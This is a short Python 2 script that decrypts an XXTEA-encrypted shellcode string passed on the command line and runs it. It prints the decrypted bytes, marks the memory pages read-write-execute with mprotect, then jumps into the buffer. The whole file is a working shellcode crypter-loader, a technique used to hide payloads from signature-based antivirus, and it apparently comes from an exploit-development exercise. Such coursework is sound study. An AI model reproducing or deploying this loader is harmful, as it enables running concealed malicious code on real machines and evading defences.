#!/usr/bin/env python
# Got rid of SEGFAULT using the solution provider here:
# https://stackoverflow.com/questions/19326409/python-ctype-segmentation-fault

import random, string
import xxtea
import sys, time
import getopt
import fileinput
from ctypes import *

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-k, --key: specify the decryption key"
    print "\t-e, --encrypted-shellcode: specify the encrypted payload"

    return 0

def decrypt(enc, key):
    return xxtea.decrypt(enc, key)

def main(argv):

    key = ""
    enc = ""

    try:
        opts, args=getopt.getopt(argv, "hk:e:", ["help", "key", "encrypted-shellcode"] )
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=arg
        elif opt in ('-e', '--encrypted-shellcode'):
            enc = arg


    if not key:
        print "Please specify a decryption key using the -k flag";
        help();
        sys.exit(-2);

    if not enc:
        print "Please specify a payload to decrypt using the -e flag";
        help();
        sys.exit(-3);



    enc_b= enc.replace('\\x', '').decode('hex')

    shellcode_data=decrypt(enc_b, key);
    sys.stdout.write("decrypted shellcode: \\x")
    sys.stdout.flush()
    print '\\x'.join(map("%2.2x".__mod__, map(ord, shellcode_data)))

    print "launching the shellcode..."


    shellcode=create_string_buffer(shellcode_data)
    function  = cast(shellcode, CFUNCTYPE(None))

    addr = cast(function, c_void_p).value
    libc = CDLL('libc.so.6')
    pagesize = libc.getpagesize()
    addr_page = (addr // pagesize) * pagesize

    for page_start in range(addr_page, addr+len(shellcode_data), pagesize):
        assert libc.mprotect(page_start, pagesize, 0x7) == 0
    function()
    
if __name__ == "__main__":
    main(sys.argv[1:])
